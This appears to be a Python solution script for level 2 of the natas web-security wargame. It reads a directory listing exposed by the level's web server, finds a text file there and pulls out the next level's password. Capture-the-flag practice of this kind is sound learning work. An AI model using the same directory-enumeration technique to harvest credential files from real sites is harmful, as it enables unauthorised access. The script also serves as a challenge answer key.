"""
natas2: request a directory to see its contents
"""

import re
import requests
from bs4 import BeautifulSoup
from typing import Optional

from natas_utils import *

LEVEL = 2

def solve(url: str, login: LevelLogin) -> Optional[str]:
    response = requests.get(url, auth=login)
    response.raise_for_status()

    soup = BeautifulSoup(response.text, "html.parser")
    # print(soup.prettify())
    content = soup.find("div", {"id": "content"})
    # print(content.prettify())

    # image file lives in a subdirectory
    img_path = content.find("img").get("src")
    files_dir = '/'.join(img_path.split('/')[:-1])

    # list subdirectory and find a text file
    response = requests.get(f"{url}/{files_dir}", auth=login)
    response.raise_for_status()

    soup = BeautifulSoup(response.text, "html.parser")
    # print(soup.prettify())

    filename_elem = soup.find("a", attrs={"href": re.compile(r"\.txt$")}, recursive=True)
    users_file = filename_elem.text

    # get the file!
    response = requests.get(f"{url}/{files_dir}/{users_file}", auth=login)
    response.raise_for_status()
    # print(response.text)

    natas3_password = None
    for line in response.text.split():
        split_line = line.split(':')
        if split_line[0] == "natas3":
            natas3_password = split_line[-1]

    return natas3_password

if __name__ == "__main__":
    url, login = load_level(LEVEL)
    natas3_password = solve(url, login)

    if natas3_password:
        print("natas3:", natas3_password)
        store_level_password(LEVEL + 1, natas3_password)
    else:
        exit("failed to get natas3 password")